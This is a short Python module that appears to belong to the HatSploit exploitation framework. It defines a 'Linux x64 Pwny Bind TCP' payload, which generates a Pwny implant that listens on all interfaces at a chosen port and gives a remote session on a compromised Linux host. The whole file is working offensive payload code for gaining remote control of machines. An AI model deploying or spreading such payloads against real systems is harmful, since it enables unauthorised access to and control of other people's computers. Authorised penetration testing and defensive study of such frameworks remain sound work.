#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Pwny Bind TCP",
            'Payload': "linux/x64/pwny_bind_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux x64 Pwny Bind TCP",
            'Architecture': "x64",
            'Platform': "linux",
            'Session': PwnySession,
            'Rank': "high",
            'Type': "bind_tcp"
        }

    def run(self):
        return self.get_pwny(
            self.details['Platform'],
            self.details['Architecture'],
            {
                'host': '0.0.0.0',
                'port': self.handler['BPORT'],
                'type': self.details['Type']
            }
        )
